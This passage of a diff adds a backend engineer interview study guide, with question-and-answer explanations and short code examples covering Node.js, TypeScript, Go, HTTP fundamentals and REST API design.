@@ -11089,3 +11089,4158 @@ Following the same "blameless post-mortem" principles used for general productio
 *This completes the Security Interview Questions set (100 questions): Web/App Security Fundamentals, Authentication/Authorization/Cryptography, Infrastructure/Cloud/Container Security, and Secure SDLC/Testing/Compliance.*
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# Backend Engineer Interview Q&A — Complete Study Material
+
+Every requirement in the job description is covered here as interview questions, each with an answer and an example.
+
+**How to use this file:** Read one section a day. Cover the answer, say your own answer out loud, then check. Type the examples and run them yourself.
+
+## Table of Contents
+
+1. [Node.js](#1-nodejs)
+2. [TypeScript](#2-typescript)
+3. [Golang](#3-golang)
+4. [HTTP Fundamentals](#4-http-fundamentals)
+5. [REST API Design and Integrations](#5-rest-api-design-and-integrations)
+6. [Authentication and Authorization (JWT, OAuth, RBAC)](#6-authentication-and-authorization)
+7. [Error Handling and Backend Architecture](#7-error-handling-and-backend-architecture)
+8. [SQL Databases](#8-sql-databases)
+9. [MongoDB / NoSQL](#9-mongodb--nosql)
+10. [Redis and Caching](#10-redis-and-caching)
+11. [React.js](#11-reactjs)
+12. [Flutter Basics](#12-flutter-basics)
+13. [System Design](#13-system-design)
+14. [Microservices, Queues, Event-Driven, WebSockets, API Gateway, Serverless](#14-microservices-queues-event-driven-websockets-api-gateway-serverless)
+15. [Docker and Docker Compose](#15-docker-and-docker-compose)
+16. [CI/CD, Cloud and Kubernetes](#16-cicd-cloud-and-kubernetes)
+17. [API Security and OWASP](#17-api-security-and-owasp)
+18. [Observability (Grafana, Prometheus, OpenTelemetry, ELK)](#18-observability)
+19. [Testing](#19-testing)
+20. [AI-Assisted Development](#20-ai-assisted-development)
+21. [Debugging Scenarios](#21-debugging-scenarios)
+22. [Behavioural Questions](#22-behavioural-questions)
+
+---
+
+## 1. Node.js
+
+### Q1. What is Node.js and why is it good for backend APIs?
+**Answer:** Node.js is a JavaScript runtime built on Chrome's V8 engine. It uses a single main thread with **non-blocking I/O**: while it waits for a database or network response, it handles other requests instead of sitting idle. This makes it very efficient for I/O-heavy work like APIs, real-time apps and integrations. It is weaker for CPU-heavy work, because heavy computation blocks the single thread.
+
+**Example:**
+```js
+const http = require('http');
+http.createServer((req, res) => {
+  res.writeHead(200, { 'Content-Type': 'application/json' });
+  res.end(JSON.stringify({ message: 'Hello' }));
+}).listen(3000);
+```
+
+### Q2. Explain the event loop.
+**Answer:** The event loop lets Node do non-blocking work on one thread. Synchronous code runs on the call stack. Async operations are handed to the OS or the libuv thread pool; when they finish, their callbacks are queued. The event loop picks callbacks from the queues when the stack is empty.
+
+Phases in order: **timers** (`setTimeout`, `setInterval`) → **pending callbacks** → **poll** (I/O callbacks) → **check** (`setImmediate`) → **close callbacks**. After every callback, Node drains the **microtask queues**: first `process.nextTick`, then promise callbacks.
+
+**Example — predict the output:**
+```js
+console.log('1');
+setTimeout(() => console.log('2'), 0);
+setImmediate(() => console.log('3'));
+Promise.resolve().then(() => console.log('4'));
+process.nextTick(() => console.log('5'));
+console.log('6');
+// Output: 1 6 5 4 2 3   (2 and 3 can swap in the main module; inside an I/O callback 3 always comes first)
+```
+
+### Q3. Is Node.js single-threaded?
+**Answer:** Your JavaScript runs on one main thread. But Node itself uses more threads: libuv has a thread pool (default 4, set with `UV_THREADPOOL_SIZE`) for file system, DNS lookup, crypto and compression work. You can also create threads with `worker_threads` and processes with `cluster` or `child_process`.
+
+**Example:**
+```js
+const crypto = require('crypto');
+// These 4 hash operations run in parallel on the libuv thread pool
+for (let i = 0; i < 4; i++) {
+  crypto.pbkdf2('pass', 'salt', 100000, 64, 'sha512', () => console.log('done', i));
+}
+```
+
+### Q4. `process.nextTick` vs `setImmediate` vs `setTimeout(fn, 0)`?
+**Answer:**
+- `process.nextTick`: runs right after the current operation, before promises and before the event loop continues. Overusing it can starve I/O.
+- `setImmediate`: runs in the **check** phase, after I/O polling.
+- `setTimeout(fn, 0)`: runs in the **timers** phase, after at least ~1 ms.
+
+**Example:**
+```js
+const fs = require('fs');
+fs.readFile(__filename, () => {
+  setTimeout(() => console.log('timeout'), 0);
+  setImmediate(() => console.log('immediate'));
+});
+// Inside an I/O callback, output is always: immediate, timeout
+```
+
+### Q5. Callbacks vs Promises vs async/await?
+**Answer:**
+- **Callbacks**: a function passed to run later. Nesting leads to "callback hell" and error handling with `(err, data)` on every level.
+- **Promises**: an object for a future value with states *pending → fulfilled / rejected*. Chainable with `.then()` and `.catch()`.
+- **async/await**: cleaner syntax on top of promises; code reads top to bottom and errors use `try/catch`.
+
+**Example:**
+```js
+// Callback
+getUser(id, (err, user) => {
+  if (err) return handle(err);
+  getOrders(user.id, (err, orders) => { /* ... */ });
+});
+
+// Promise
+getUser(id).then(user => getOrders(user.id)).then(console.log).catch(handle);
+
+// async/await
+async function load(id) {
+  try {
+    const user = await getUser(id);
+    return await getOrders(user.id);
+  } catch (err) {
+    handle(err);
+  }
+}
+```
+
+### Q6. `Promise.all` vs `Promise.allSettled` vs `Promise.race` vs `Promise.any`?
+**Answer:**
+| Method | Resolves when | Rejects when |
+|---|---|---|
+| `all` | all fulfil (returns array) | **any one** rejects (fail fast) |
+| `allSettled` | all finish (returns status of each) | never |
+| `race` | first one settles (fulfil or reject) | first one rejects |
+| `any` | first one fulfils | all reject (`AggregateError`) |
+
+**Example:**
+```js
+// Run independent calls in parallel
+const [user, orders] = await Promise.all([getUser(id), getOrders(id)]);
+
+// Send 3 notifications; don't fail if one channel fails
+const results = await Promise.allSettled([sendEmail(), sendSms(), sendPush()]);
+results.forEach(r => r.status === 'rejected' && console.error(r.reason));
+
+// Timeout pattern
+const withTimeout = (p, ms) =>
+  Promise.race([p, new Promise((_, rej) => setTimeout(() => rej(new Error('Timeout')), ms))]);
+```
+
+### Q7. What is wrong with this code and how do you fix it?
+```js
+for (const id of ids) {
+  const user = await getUser(id); // sequential
+  users.push(user);
+}
+```
+**Answer:** Each call waits for the previous one, so 10 calls of 100 ms take 1 second. If calls are independent, run them in parallel. For very large lists, limit concurrency so you don't overload the database or API.
+
+**Example:**
+```js
+// Parallel
+const users = await Promise.all(ids.map(id => getUser(id)));
+
+// Limited concurrency (5 at a time) with p-limit
+import pLimit from 'p-limit';
+const limit = pLimit(5);
+const users2 = await Promise.all(ids.map(id => limit(() => getUser(id))));
+```
+
+### Q8. How do you handle a CPU-heavy task in Node?
+**Answer:** CPU work blocks the event loop, so every other request waits. Options:
+1. `worker_threads` for in-process parallel computation.
+2. A background job queue (BullMQ) processed by separate worker processes.
+3. A separate service in a better-suited language (Go, Rust, Python for ML).
+4. Break work into chunks with `setImmediate` so the loop can breathe.
+
+**Example:**
+```js
+// main.js
+const { Worker } = require('worker_threads');
+function runHeavy(data) {
+  return new Promise((resolve, reject) => {
+    const w = new Worker('./heavy.js', { workerData: data });
+    w.on('message', resolve);
+    w.on('error', reject);
+  });
+}
+
+// heavy.js
+const { parentPort, workerData } = require('worker_threads');
+let sum = 0;
+for (let i = 0; i < workerData.n; i++) sum += i;
+parentPort.postMessage(sum);
+```
+
+### Q9. What are Streams and why use them?
+**Answer:** Streams process data in chunks instead of loading it all in memory. Types: **Readable**, **Writable**, **Duplex** (both), **Transform** (modify data while passing). They support **back-pressure**: if the writer is slow, the reader pauses. Use them for large files, CSV exports, uploads and proxying.
+
+**Example:**
+```js
+const fs = require('fs');
+const zlib = require('zlib');
+const { pipeline } = require('stream/promises');
+
+// Compress a 5 GB file with constant memory usage
+await pipeline(
+  fs.createReadStream('big.log'),
+  zlib.createGzip(),
+  fs.createWriteStream('big.log.gz')
+);
+```
+
+### Q10. What is EventEmitter?
+**Answer:** A class that lets objects emit named events and register listeners. Streams, HTTP servers and sockets are all EventEmitters. Use it to decouple parts of your code inside one process.
+
+**Example:**
+```js
+const EventEmitter = require('events');
+class OrderEvents extends EventEmitter {}
+const orders = new OrderEvents();
+
+orders.on('placed', (order) => sendEmail(order));
+orders.on('placed', (order) => updateAnalytics(order));
+orders.emit('placed', { id: 1, total: 500 });
+```
+
+### Q11. CommonJS vs ES Modules?
+**Answer:**
+| CommonJS | ES Modules |
+|---|---|
+| `require()` / `module.exports` | `import` / `export` |
+| Loaded synchronously at runtime | Static, analysed before running (tree-shaking) |
+| Default in Node `.js` files | Enabled with `"type": "module"` or `.mjs` |
+| `__dirname` available | Use `import.meta.url` |
+
+**Example:**
+```js
+// CommonJS
+const express = require('express');
+module.exports = { add };
+
+// ESM
+import express from 'express';
+export function add(a, b) { return a + b; }
+```
+
+### Q12. How do you scale a Node.js app on one machine and across machines?
+**Answer:** On one machine, run one process per CPU core using the `cluster` module or PM2. Across machines, run several instances behind a load balancer. For this to work, the app must be **stateless**: sessions, caches and uploads go to Redis, the database or object storage, not process memory.
+
+**Example:**
+```bash
+# PM2: one process per core, zero-downtime reload
+pm2 start dist/server.js -i max
+pm2 reload all
+```
+
+### Q13. What causes memory leaks in Node and how do you find them?
+**Answer:** Common causes: global variables or caches that grow forever, event listeners added but never removed, closures holding large objects, timers never cleared. Find them by watching memory (`process.memoryUsage()`, metrics), taking heap snapshots with `node --inspect` + Chrome DevTools, and comparing snapshots over time.
+
+**Example:**
+```js
+// Leak: cache grows forever
+const cache = {};
+app.get('/user/:id', async (req, res) => {
+  cache[req.params.id] = await getUser(req.params.id); // never evicted
+});
+
+// Fix: bounded LRU cache with TTL
+import { LRUCache } from 'lru-cache';
+const safeCache = new LRUCache({ max: 1000, ttl: 60_000 });
+```
+
+### Q14. How do you handle environment configuration?
+**Answer:** Read config from environment variables (12-factor app), use a `.env` file only for local development, never commit secrets, and **validate config at startup** so the app fails fast if something is missing.
+
+**Example:**
+```ts
+import { z } from 'zod';
+const Env = z.object({
+  NODE_ENV: z.enum(['development', 'test', 'production']),
+  PORT: z.coerce.number().default(3000),
+  DATABASE_URL: z.string().url(),
+  JWT_SECRET: z.string().min(32),
+});
+export const env = Env.parse(process.env); // throws on startup if invalid
+```
+
+### Q15. What is middleware in Express?
+**Answer:** A function `(req, res, next)` that runs in the request pipeline. It can read/modify the request, end the response, or call `next()` to pass control on. Order matters. Error middleware has 4 parameters `(err, req, res, next)` and must be registered last.
+
+**Example:**
+```js
+app.use(express.json());                 // parse body
+app.use((req, res, next) => {            // logging
+  const start = Date.now();
+  res.on('finish', () => console.log(req.method, req.url, res.statusCode, Date.now() - start, 'ms'));
+  next();
+});
+app.use('/v1/orders', requireAuth, orderRouter);
+app.use(errorHandler);                   // always last
+```
+
+### Q16. What is the difference between `npm install` and `npm ci`? What does `^` mean in versions?
+**Answer:** `npm install` can update `package-lock.json`; `npm ci` installs exactly what is in the lock file and fails if it doesn't match `package.json` — use it in CI and Docker. Semver is `MAJOR.MINOR.PATCH`. `^1.4.2` allows `1.x.x` (no major changes); `~1.4.2` allows `1.4.x` (patches only).
+
+**Example:**
+```json
+"dependencies": {
+  "express": "^4.19.2",
+  "zod": "~3.23.8"
+}
+```
+
+### Q17. What is graceful shutdown?
+**Answer:** When the app gets a stop signal (SIGTERM during a deploy), it should stop accepting new requests, finish in-flight requests, close DB/Redis connections, then exit. Without it, users get errors during every deploy.
+
+**Example:**
+```js
+const server = app.listen(3000);
+process.on('SIGTERM', () => {
+  server.close(async () => {
+    await db.end();
+    await redis.quit();
+    process.exit(0);
+  });
+  setTimeout(() => process.exit(1), 10_000); // force exit after 10 s
+});
+```
+
+---
+
+## 2. TypeScript
+
+### Q1. Why use TypeScript for backend development?
+**Answer:** It catches type errors at compile time, gives better autocomplete and refactoring, documents data shapes, and makes large codebases safer to change. Types are removed at runtime, so you still need runtime validation for external input.
+
+**Example:**
+```ts
+function total(price: number, qty: number): number {
+  return price * qty;
+}
+total('100', 2); // Compile error: Argument of type 'string' is not assignable to 'number'
+```
+
+### Q2. `interface` vs `type`?
+**Answer:** Both describe object shapes. `interface` can be extended with `extends` and **merged** (declared twice and combined). `type` can also express unions, intersections, tuples and mapped types. A common rule: `interface` for object shapes and public contracts, `type` for unions and compositions.
+
+**Example:**
+```ts
+interface User { id: string; email: string; }
+interface Admin extends User { permissions: string[]; }
+
+type Status = 'pending' | 'paid' | 'cancelled';   // only possible with type
+type WithTimestamps<T> = T & { createdAt: Date; updatedAt: Date };
+```
+
+### Q3. What are generics?
+**Answer:** Generics let you write reusable code that works with many types while keeping type safety. `T` is a type parameter filled in when the function or type is used.
+
+**Example:**
+```ts
+interface ApiResponse<T> {
+  data: T;
+  error: string | null;
+}
+
+async function fetchJson<T>(url: string): Promise<ApiResponse<T>> {
+  const res = await fetch(url);
+  return { data: (await res.json()) as T, error: null };
+}
+
+const r = await fetchJson<User[]>('/api/users'); // r.data is User[]
+```
+
+### Q4. Explain the common utility types.
+**Answer:**
+| Type | Meaning |
+|---|---|
+| `Partial<T>` | all fields optional |
+| `Required<T>` | all fields required |
+| `Pick<T, K>` | only fields K |
+| `Omit<T, K>` | all except K |
+| `Record<K, V>` | object with keys K and values V |
+| `Readonly<T>` | fields cannot be changed |
+| `ReturnType<F>` | return type of a function |
+
+**Example:**
+```ts
+interface User { id: string; email: string; passwordHash: string; name: string; }
+
+type PublicUser = Omit<User, 'passwordHash'>;     // safe to send to client
+type UpdateUserDto = Partial<Pick<User, 'name' | 'email'>>;
+const roleLimits: Record<'admin' | 'user', number> = { admin: 1000, user: 100 };
+```
+
+### Q5. `any` vs `unknown` vs `never`?
+**Answer:**
+- `any`: turns off type checking. Avoid it.
+- `unknown`: "could be anything", but you must check its type before using it. Safe choice for external data and caught errors.
+- `never`: a value that can never exist; used for functions that always throw and for exhaustive checks.
+
+**Example:**
+```ts
+function parse(input: unknown) {
+  if (typeof input === 'string') return input.toUpperCase(); // narrowed to string
+  throw new Error('Expected string');
+}
+
+type Shape = { kind: 'circle'; r: number } | { kind: 'square'; side: number };
+function area(s: Shape): number {
+  switch (s.kind) {
+    case 'circle': return Math.PI * s.r ** 2;
+    case 'square': return s.side ** 2;
+    default: const _exhaustive: never = s; return _exhaustive; // error if a new kind is added
+  }
+}
+```
+
+### Q6. What is type narrowing and a discriminated union?
+**Answer:** Narrowing is how TypeScript refines a broad type to a specific one using checks (`typeof`, `instanceof`, `in`, equality). A discriminated union is a union where every member has a common literal field (like `kind` or `status`) that TypeScript uses to narrow.
+
+**Example:**
+```ts
+type Result =
+  | { ok: true; data: User }
+  | { ok: false; error: string };
+
+function handle(r: Result) {
+  if (r.ok) console.log(r.data.email); // TS knows data exists
+  else console.error(r.error);         // TS knows error exists
+}
+```
+
+### Q7. If you use TypeScript, why do you still need runtime validation?
+**Answer:** TypeScript types disappear after compilation. A request body, a third-party API response or a database JSON column can contain anything at runtime. Validate external input with a schema library (Zod, Joi, class-validator) and derive the TS type from the schema so they never drift apart.
+
+**Example:**
+```ts
+import { z } from 'zod';
+const CreateOrder = z.object({
+  items: z.array(z.object({ productId: z.string(), qty: z.number().int().positive() })).min(1),
+  couponCode: z.string().optional(),
+});
+type CreateOrder = z.infer<typeof CreateOrder>;
+
+app.post('/orders', (req, res) => {
+  const parsed = CreateOrder.safeParse(req.body);
+  if (!parsed.success) return res.status(400).json({ errors: parsed.error.issues });
+  // parsed.data is fully typed
+});
+```
+
+### Q8. What does `strict` mode do in tsconfig?
+**Answer:** It turns on a group of safety checks, most importantly `strictNullChecks` (you must handle `null`/`undefined`) and `noImplicitAny` (no hidden `any`). Always enable it in new projects.
+
+**Example:**
+```ts
+// with strictNullChecks
+const user = users.find(u => u.id === id); // User | undefined
+console.log(user.email);   // Error: 'user' is possibly 'undefined'
+console.log(user?.email);  // OK
+```
+
+### Q9. How do you add a custom property like `req.user` to Express's Request type?
+**Answer:** Use **declaration merging** to extend Express's `Request` interface.
+
+**Example:**
+```ts
+// src/types/express.d.ts
+import 'express';
+declare global {
+  namespace Express {
+    interface Request {
+      user?: { id: string; role: 'admin' | 'user' };
+      id?: string;
+    }
+  }
+}
+```
+
+---
+
+## 3. Golang
+
+### Q1. Why would a team choose Go for backend services?
+**Answer:** Go compiles to a single fast binary, has a simple language, built-in concurrency (goroutines and channels), a strong standard library (`net/http`, `encoding/json`), fast startup and low memory use. It is popular for APIs, microservices, infrastructure tools (Docker and Kubernetes are written in Go) and high-concurrency systems.
+
+**Example:**
+```go
+package main
+
+import (
+    "encoding/json"
+    "net/http"
+)
+
+func main() {
+    http.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
+        json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
+    })
+    http.ListenAndServe(":8080", nil)
+}
+```
+
+### Q2. Explain slices, maps and structs.
+**Answer:**
+- **Slice**: a dynamic view over an array (pointer, length, capacity). `append` may allocate a new array when capacity runs out.
+- **Map**: hash table `map[K]V`. Not safe for concurrent writes.
+- **Struct**: a group of named fields; Go's way to model data (no classes).
+
+**Example:**
+```go
+type User struct {
+    ID    int    `json:"id"`
+    Email string `json:"email"`
+}
+
+users := []User{{1, "a@x.com"}}
+users = append(users, User{ID: 2, Email: "b@x.com"})
+
+byEmail := map[string]User{}
+for _, u := range users {
+    byEmail[u.Email] = u
+}
+if u, ok := byEmail["a@x.com"]; ok {
+    fmt.Println(u.ID)
+}
+```
+
+### Q3. How do interfaces work in Go?
+**Answer:** An interface is a set of method signatures. A type implements it **implicitly** just by having those methods — no `implements` keyword. This makes it easy to swap implementations (e.g. a real DB vs a mock in tests).
+
+**Example:**
+```go
+type UserRepo interface {
+    FindByID(ctx context.Context, id int) (*User, error)
+}
+
+type PostgresUserRepo struct{ db *sql.DB }
+func (r *PostgresUserRepo) FindByID(ctx context.Context, id int) (*User, error) { /* SQL */ return nil, nil }
+
+type MockUserRepo struct{}
+func (m *MockUserRepo) FindByID(ctx context.Context, id int) (*User, error) { return &User{ID: id}, nil }
+
+type UserService struct{ repo UserRepo } // works with either
+```
+
+### Q4. How does error handling work in Go?
+**Answer:** Functions return an `error` as the last value; the caller checks `if err != nil`. Wrap errors with context using `%w`, and check them with `errors.Is` (specific value) and `errors.As` (specific type). `panic` is only for unrecoverable programmer bugs.
+
+**Example:**
+```go
+var ErrNotFound = errors.New("not found")
+
+func (s *UserService) Get(ctx context.Context, id int) (*User, error) {
+    u, err := s.repo.FindByID(ctx, id)
+    if errors.Is(err, sql.ErrNoRows) {
+        return nil, ErrNotFound
+    }
+    if err != nil {
+        return nil, fmt.Errorf("get user %d: %w", id, err)
+    }
+    return u, nil
+}
+
+// handler
+if errors.Is(err, ErrNotFound) {
+    http.Error(w, "user not found", http.StatusNotFound)
+    return
+}
+```
+
+### Q5. Value receiver vs pointer receiver?
+**Answer:** A value receiver gets a copy, so changes are lost. A pointer receiver can modify the original and avoids copying large structs. Use pointer receivers when the method changes state or the struct is large; be consistent within a type.
+
+**Example:**
+```go
+type Counter struct{ n int }
+func (c Counter) IncValue()    { c.n++ } // modifies a copy
+func (c *Counter) IncPointer() { c.n++ } // modifies the original
+
+c := Counter{}
+c.IncValue()   // c.n == 0
+c.IncPointer() // c.n == 1
+```
+
+### Q6. What is a goroutine and how is it different from an OS thread?
+**Answer:** A goroutine is a lightweight function running concurrently, managed by the Go runtime. It starts with a ~2 KB stack that grows as needed, while OS threads use ~1 MB. The Go scheduler multiplexes thousands of goroutines over a few OS threads (M:N scheduling), so you can run 100,000 goroutines easily.
+
+**Example:**
+```go
+for i := 0; i < 3; i++ {
+    go func(n int) {
+        fmt.Println("worker", n)
+    }(i)
+}
+time.Sleep(100 * time.Millisecond) // in real code use sync.WaitGroup, not Sleep
+```
+
+### Q7. What are channels? Buffered vs unbuffered?
+**Answer:** Channels let goroutines send values to each other safely ("share memory by communicating"). An **unbuffered** channel blocks the sender until a receiver takes the value (synchronous handoff). A **buffered** channel holds up to N values; the sender only blocks when it's full. Close a channel to tell receivers no more values are coming.
+
+**Example:**
+```go
+jobs := make(chan int, 100)   // buffered
+results := make(chan int, 100)
+
+// worker pool with 3 workers
+for w := 1; w <= 3; w++ {
+    go func() {
+        for j := range jobs {     // stops when jobs is closed
+            results <- j * 2
+        }
+    }()
+}
+for i := 1; i <= 5; i++ { jobs <- i }
+close(jobs)
+for i := 1; i <= 5; i++ { fmt.Println(<-results) }
+```
+
+### Q8. What does `select` do?
+**Answer:** `select` waits on several channel operations and runs whichever is ready first. It is used for timeouts, cancellation and combining channels.
+
+**Example:**
+```go
+select {
+case res := <-resultCh:
+    fmt.Println("got", res)
+case <-time.After(2 * time.Second):
+    fmt.Println("timeout")
+case <-ctx.Done():
+    fmt.Println("cancelled:", ctx.Err())
+}
+```
+
+### Q9. What is `context.Context` used for?
+**Answer:** It carries **cancellation signals, deadlines and request-scoped values** across function calls and goroutines. Pass it as the first argument to every function that does I/O. If the client disconnects or the deadline passes, all downstream DB queries and HTTP calls are cancelled too.
+
+**Example:**
+```go
+func handler(w http.ResponseWriter, r *http.Request) {
+    ctx, cancel := context.WithTimeout(r.Context(), 3*time.Second)
+    defer cancel()
+
+    row := db.QueryRowContext(ctx, "SELECT email FROM users WHERE id=$1", 42)
+    var email string
+    if err := row.Scan(&email); err != nil {
+        http.Error(w, "timeout or error", http.StatusGatewayTimeout)
+        return
+    }
+    fmt.Fprint(w, email)
+}
+```
+
+### Q10. How do you prevent race conditions in Go?
+**Answer:** A race happens when goroutines access shared data at the same time and at least one writes. Prevent it with `sync.Mutex`/`RWMutex`, `sync/atomic`, or by passing data through channels instead of sharing it. Detect races with `go test -race` or `go run -race`.
+
+**Example:**
+```go
+type SafeCounter struct {
+    mu sync.Mutex
+    m  map[string]int
+}
+
+func (c *SafeCounter) Inc(key string) {
+    c.mu.Lock()
+    defer c.mu.Unlock()
+    c.m[key]++
+}
+```
+
+### Q11. What is `sync.WaitGroup`?
+**Answer:** It waits for a group of goroutines to finish. Call `Add(n)` before starting, `Done()` in each goroutine (usually with `defer`), and `Wait()` to block until all are done. For "wait and return the first error", use `errgroup`.
+
+**Example:**
+```go
+import "golang.org/x/sync/errgroup"
+
+g, ctx := errgroup.WithContext(ctx)
+var user *User
+var orders []Order
+g.Go(func() error { var err error; user, err = getUser(ctx, id); return err })
+g.Go(func() error { var err error; orders, err = getOrders(ctx, id); return err })
+if err := g.Wait(); err != nil {
+    return err // first error; ctx cancels the other call
+}
+```
+
+### Q12. What does `defer` do?
+**Answer:** `defer` schedules a function call to run when the surrounding function returns, in last-in-first-out order. Used for cleanup: closing files, rows and response bodies, unlocking mutexes.
+
+**Example:**
+```go
+func readConfig(path string) ([]byte, error) {
+    f, err := os.Open(path)
+    if err != nil {
+        return nil, err
+    }
+    defer f.Close() // runs no matter how we return
+    return io.ReadAll(f)
+}
+```
+
+### Q13. How do you write HTTP middleware in Go?
+**Answer:** Middleware is a function that takes an `http.Handler` and returns a new `http.Handler` that wraps it.
+
+**Example:**
+```go
+func Logging(next http.Handler) http.Handler {
+    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        start := time.Now()
+        next.ServeHTTP(w, r)
+        log.Printf("%s %s %v", r.Method, r.URL.Path, time.Since(start))
+    })
+}
+
+mux := http.NewServeMux()
+mux.HandleFunc("GET /users/{id}", getUser) // Go 1.22+ routing patterns
+http.ListenAndServe(":8080", Logging(mux))
+```
+
+### Q14. What is a goroutine leak?
+**Answer:** A goroutine that never exits, usually because it is blocked forever on a channel nobody writes to or reads from. Leaks slowly eat memory. Prevent them with `context` cancellation, closing channels, and buffered channels where a sender may outlive the receiver.
+
+**Example:**
+```go
+// Leak: if timeout fires first, the goroutine blocks forever on ch <- ...
+ch := make(chan int)
+go func() { ch <- slowCall() }()
+
+// Fix: buffer of 1 lets the goroutine finish even if nobody reads
+ch := make(chan int, 1)
+```
+
+---
+
+## 4. HTTP Fundamentals
+
+### Q1. What happens when you type a URL and press Enter?
+**Answer:**
+1. **DNS lookup**: the domain is resolved to an IP (browser cache → OS → resolver → root/TLD/authoritative servers).
+2. **TCP connection**: 3-way handshake (SYN, SYN-ACK, ACK).
+3. **TLS handshake** (HTTPS): agree on encryption, verify the server certificate, create session keys.
+4. **HTTP request** is sent (method, path, headers, body).
+5. Request passes a **load balancer / reverse proxy** to an app server, which may hit cache and database.
+6. **HTTP response** returns (status, headers, body).
+7. Browser parses HTML, fetches CSS/JS/images, renders the page.
+
+**Example:**
+```bash
+curl -v https://api.example.com/users/1
+# -v shows: DNS → "Connected to ..." → TLS handshake → request headers → response headers → body
+```
+
+### Q2. What is the structure of an HTTP request and response?
+**Answer:** Request = method + path + version, headers, blank line, optional body. Response = version + status code, headers, blank line, body.
+
+**Example:**
+```http
+POST /v1/orders HTTP/1.1
+Host: api.shop.com
+Authorization: Bearer eyJhbGci...
+Content-Type: application/json
+
+{"items":[{"productId":"p1","qty":2}]}
+```
+```http
+HTTP/1.1 201 Created
+Location: /v1/orders/981
+Content-Type: application/json
+
+{"id":981,"status":"pending"}
+```
+
+### Q3. What does "HTTP is stateless" mean?
+**Answer:** The server doesn't remember earlier requests. Each request must carry everything needed to process it — usually a cookie (session id) or a token in the `Authorization` header. Statelessness makes horizontal scaling easy: any server can handle any request.
+
+**Example:** Two requests from the same user may hit server A and then server B. Both work because each carries `Authorization: Bearer <token>`.
+
+### Q4. HTTP/1.1 vs HTTP/2 vs HTTP/3?
+**Answer:**
+| Version | Key features |
+|---|---|
+| HTTP/1.1 | Text protocol, keep-alive connections, one request at a time per connection (head-of-line blocking) |
+| HTTP/2 | Binary, **multiplexing** (many requests on one connection), header compression (HPACK), used by gRPC |
+| HTTP/3 | Runs over **QUIC** (UDP), faster connection setup, no TCP head-of-line blocking, better on mobile networks |
+
+**Example:** A page loading 50 small assets over HTTP/1.1 needs several parallel connections; over HTTP/2 they share one connection.
+
+### Q5. What is HTTPS / TLS?
+**Answer:** HTTPS is HTTP over TLS. TLS provides **encryption** (nobody can read traffic), **integrity** (nobody can change it unnoticed) and **authentication** (a certificate signed by a trusted Certificate Authority proves the server's identity). Asymmetric crypto is used in the handshake to agree a symmetric session key, which encrypts the actual data.
+
+**Example:** Terminate TLS at a load balancer or NGINX, then use HSTS so browsers always use HTTPS:
+```
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+```
+
+### Q6. What is CORS and how does a preflight work?
+**Answer:** Browsers block JavaScript from reading responses from a different origin (scheme + host + port) unless the server allows it via CORS headers. For "non-simple" requests (e.g. `PUT`, `DELETE`, JSON body, custom headers), the browser first sends an `OPTIONS` **preflight** asking permission. CORS is a browser rule only; it does not protect your API from curl or other servers.
+
+**Example:**
+```http
+OPTIONS /v1/orders
+Origin: https://app.shop.com
+Access-Control-Request-Method: POST
+Access-Control-Request-Headers: Content-Type, Authorization
+
+HTTP/1.1 204 No Content
+Access-Control-Allow-Origin: https://app.shop.com
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE
+Access-Control-Allow-Headers: Content-Type, Authorization
+Access-Control-Allow-Credentials: true
+```
+```js
+app.use(cors({ origin: ['https://app.shop.com'], credentials: true }));
+```
+
+### Q7. Explain HTTP caching headers.
+**Answer:**
+- `Cache-Control: max-age=60` → cache for 60 s. `no-store` → never cache. `no-cache` → cache but revalidate every time. `private` → browser only, not CDN. `public` → CDN may cache.
+- `ETag` → a version fingerprint of the response. Client sends `If-None-Match: <etag>`; if unchanged, server returns **304 Not Modified** with no body.
+- `Last-Modified` / `If-Modified-Since` → same idea with dates.
+
+**Example:**
+```http
+GET /v1/products/42
+HTTP/1.1 200 OK
+Cache-Control: public, max-age=300
+ETag: "a1b2c3"
+
+GET /v1/products/42
+If-None-Match: "a1b2c3"
+HTTP/1.1 304 Not Modified
+```
+
+### Q8. What are cookies and their security flags?
+**Answer:** Small key-value data the server sets with `Set-Cookie`; the browser sends it back automatically on later requests.
+- `HttpOnly`: JavaScript can't read it (protects against XSS stealing tokens).
+- `Secure`: only sent over HTTPS.
+- `SameSite=Strict|Lax|None`: controls cross-site sending (protects against CSRF).
+- `Max-Age`/`Expires`, `Domain`, `Path`.
+
+**Example:**
+```http
+Set-Cookie: refresh_token=abc123; HttpOnly; Secure; SameSite=Strict; Path=/v1/auth/refresh; Max-Age=604800
+```
+
+### Q9. What is the difference between TCP and UDP?
+**Answer:** TCP is connection-oriented, reliable and ordered (retransmits lost packets) — used by HTTP/1.1, HTTP/2, databases. UDP is connectionless, no delivery guarantee, lower latency — used by DNS, video calls, games, and QUIC/HTTP/3.
+
+**Example:** A bank API uses TCP-based HTTPS. A live video stream uses UDP because a late frame is useless anyway.
+
+---
+
+## 5. REST API Design and Integrations
+
+### Q1. What is REST?
+**Answer:** REST (Representational State Transfer) is an architectural style for APIs. Key ideas: everything is a **resource** identified by a URL; use standard **HTTP methods** for actions; communication is **stateless**; responses can be **cacheable**; uniform interface; client-server separation.
+
+**Example:**
+```
+GET    /v1/users          list users
+POST   /v1/users          create a user
+GET    /v1/users/42       get user 42
+PATCH  /v1/users/42       update some fields
+DELETE /v1/users/42       delete user 42
+GET    /v1/users/42/orders  orders of user 42
+```
+
+### Q2. Explain HTTP methods, safety and idempotency.
+**Answer:** **Safe** = doesn't change data. **Idempotent** = calling it many times has the same effect as once.
+| Method | Safe | Idempotent | Use |
+|---|---|---|---|
+| GET | ✅ | ✅ | read |
+| POST | ❌ | ❌ | create / action |
+| PUT | ❌ | ✅ | replace whole resource |
+| PATCH | ❌ | not guaranteed | partial update |
+| DELETE | ❌ | ✅ | delete |
+
+**Example:** `PUT /users/42 {"name":"Asha"}` sent 3 times → same result. `POST /orders` sent 3 times → 3 orders (unless you use an idempotency key).
+
+### Q3. PUT vs PATCH?
+**Answer:** `PUT` replaces the whole resource — fields you leave out are cleared or reset. `PATCH` updates only the fields you send.
+
+**Example:**
+```http
+# Current: {"name":"Asha","email":"a@x.com","phone":"999"}
+PUT /users/42   {"name":"Asha K","email":"a@x.com"}   → phone removed
